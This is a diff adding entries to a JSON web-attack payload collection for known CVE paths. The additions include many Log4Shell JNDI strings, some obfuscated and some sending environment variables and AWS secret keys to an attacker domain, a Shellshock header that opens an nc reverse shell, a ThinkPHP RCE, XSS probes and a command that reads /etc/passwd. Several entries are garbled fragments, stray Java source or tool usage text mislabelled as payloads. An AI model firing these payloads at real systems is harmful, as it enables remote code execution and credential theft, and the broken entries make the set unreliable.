@@ -11284,5 +11284,687 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-215142",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "public String index(@RequestHeader(\"X-Api-Version\") String apiVersion) {",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215143",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "logger.info(\"Received a request for API version \" + apiVersion);",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215144",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "return \"Hello, world!\";",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215145",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${jndi:ldap://${java:version}.domain/a}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215146",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${jndi:ldap://${env:JAVA_VERSION}.domain/a}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215147",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${jndi:ldap://${sys:java.version}.domain/a}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215148",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${jndi:ldap://${sys:java.vendor}.domain/a}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215149",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${jndi:ldap://${hostName}.domain/a}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215150",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${jndi:dns://${hostName}.domain}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215151",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "java:os",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215152",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "docker:containerId",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215153",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "web:rootDir",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215154",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "bundle:config:db.password",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215155",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "usage: log4j-scan.py [-h] [-u URL] [-l USEDLIST] [--request-type REQUEST_TYPE] [--headers-file HEADERS_FILE] [--run-all-tests] [--exclude-user-agent-fuzzing]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215157",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://10.10.10.10:1389/a}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215158",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${${lower:jndi}:${lower:rmi}://10.10.10.10:1389/poc}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215159",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${j${loWer:Nd}i${uPper::}://10.10.10.10:1389/poc}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215160",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215161",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//[ATTACKER.DOMAIN.TLD]/a}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215162",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//[ATTACKER.DOMAIN.TLD]/a}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215163",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${jndi:ldap://${env:USER}.${env:USERNAME}.[ATTACKER.DOMAIN.TLD]:1389/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215164",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "${jndi:ldap://${env:USER}.${env:USERNAME}.[ATTACKER.DOMAIN.TLD]:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215165",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "java -jar target/RogueJndi-1.1.jar --command \"whoami\" --hostname \"10.10.10.10\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215166",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Mapping ldap://10.10.10.11:1389/ to artsploit.controllers.RemoteReference",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215167",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Mapping ldap://10.10.10.11:1389/o=reference to artsploit.controllers.RemoteReference",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215168",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Mapping ldap://10.10.10.11:1389/o=tomcat to artsploit.controllers.Tomcat",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215169",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Mapping ldap://10.10.10.11:1389/o=groovy to artsploit.controllers.Groovy",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215170",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Mapping ldap://10.10.10.11:1389/o=websphere1 to artsploit.controllers.WebSphere1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215171",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Mapping ldap://10.10.10.11:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215172",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Mapping ldap://10.10.10.11:1389/o=websphere2 to artsploit.controllers.WebSphere2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215173",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Mapping ldap://10.10.10.11:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-215174",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Linux",
+    "injection_point": "query_parameter",
+    "payload_string": "echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\\r\\n\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-401865",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ".q.example.invalid}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-401956",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%252F:123@interactsh.com/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-402527",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?s=index/think\\\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-402768",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "admin/view:modules/load_module:users",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-402918",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-402931",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-402953",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ":6066",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-403061",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%2Fwp-admin%2Foptions-general.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-403310",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "admin/view:comments",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-403324",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "admin/view:modules/load_module:files",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-403364",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%2Fvcac",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-403609",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%252F",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-403613",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "&mtral_settings%5Bmtral_field_custom_url_administrator%5D=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E&mtral_settings%5Bmtral_field_editor%5D=&mtral_settings%5Bmtral_field_custom_url_editor%5D=&mtral_settings%5Bmtral_field_author%5D=&mtral_settings%5Bmtral_field",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-403614",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "&mtral_settings%5Bmtral_field_custom_url_contributor%5D=&mtral_settings%5Bmtral_field_subscriber%5D=&mtral_settings%5Bmtral_field_custom_url_subscriber%5D=&submit=Save+Changes",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-403643",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%22%2c%22source%22%3a0%7d%5d%2c%22seriesID%22%3a3%7d&arg3=undefined&arg4=undefined&arg5=undefined&arg6=undefined&arg7=undefined",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-403920",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "}}/advance/portfwd.html?token=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-403994",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%2Fadmin%2F{{realm}}%2Fconsole%2F&state=1&response_mode=query&response_type=code&scope=openid&nonce=1&code_challenge_method=S256&code_challenge={{code_challenge}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-403995",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%2Fadmin%2F{{realm}}%2Fconsole%2F&code_verifier={{code_verifier}}&",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-403997",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "&type=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-404021",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=ws://example.com/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-404042",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ".sc\\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-404043",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ".sitecore\\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-404044",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ".website\\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-404045",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ".dev.local\\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-404046",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "sc.dev.local\\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-404069",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "?view[path]={{pfield}}&view[match][$where]=global.process.mainModule.constructor._load(",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-404084",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "&give-form-minimum={{give-amount}}&give-form-maximum=1000000&give-form-hash={{give-form-hash}}&give-price-id=custom&give-amount={{give-amount}}&give_first={{firstname}}&give_last={{lastname}}&give_email={{email}}&give_stripe_payment_method=&give-user-id=1&give_action=purchase&give-gateway=manual&giv",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-404352",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "&response_type=code&scope=mcp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-404528",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "WordPress",
+    "injection_point": "query_parameter",
+    "payload_string": "%2Fwp-content%2Fuploads%2Fbricksforge%2Ftmp%2F{{probe}}.php%22%2C%22type%22%3A%22image%2Fgif%22%7D%7D%5D&form-field-{{field_id}}=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-408350",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Linux",
+    "injection_point": "query_parameter",
+    "payload_string": "Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
   }
 ]
